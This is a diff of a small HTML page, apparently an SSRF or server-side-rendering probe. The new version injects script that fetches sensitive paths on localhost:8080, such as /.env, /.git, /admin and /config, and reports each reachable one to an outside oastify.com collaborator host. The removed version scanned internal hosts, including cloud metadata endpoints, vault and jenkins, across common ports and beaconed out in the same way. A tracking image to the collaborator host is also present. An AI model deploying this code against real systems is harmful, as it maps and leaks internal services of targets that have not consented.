@@ -9,41 +9,21 @@
 
 <body>
     <h1>Hello</h1>
-    <img src="https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?ItsRenderingHtml">
+    <img src="https://v95mka1z81knecieu4spoyemadg443ss.oastify.com/?ItsRenderingHtml">
     <script>
-        const hosts = [
-            "localhost",
-            "127.0.0.1",
-            "host.docker.internal",
-            "internal",
-            "gateway",
-            "metadata.google.internal",
-            "metadata.aws.internal",
-            "kubernetes.default",
-            "vault.internal",
-            "jenkins.internal",
-            "grafana",
-            "prometheus",
-            "gitlab",
-            "nexus",
-            "dev",
-            "staging",
-            "prod",
-            "db",
-            "admin"
+        const paths = [
+            "/", "/robots.txt", "/login", "/admin", "/api", "/api/v1",
+            "/dashboard", "/config", "/metrics", "/status", "/.env", "/.git"
         ];
 
-        const ports = [80, 443, 8080, 3000, 5000, 8000];
-
-        hosts.forEach(host => {
-            ports.forEach(port => {
-                fetch(`http://${host}:${port}`, { mode: "no-cors" })
-                    .then(() => {
-                        fetch(`https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?open=${host}:${port}`);
-                    })
-                    .catch(() => { });
-            });
+        paths.forEach(path => {
+            fetch(`http://localhost:8080${path}`, { mode: "no-cors" })
+                .then(() => {
+                    fetch(`https://v95mka1z81knecieu4spoyemadg443ss.oastify.com/?hit=8080${btoa(path)}`);
+                })
+                .catch(() => { });
         });
+
 
     </script>
 
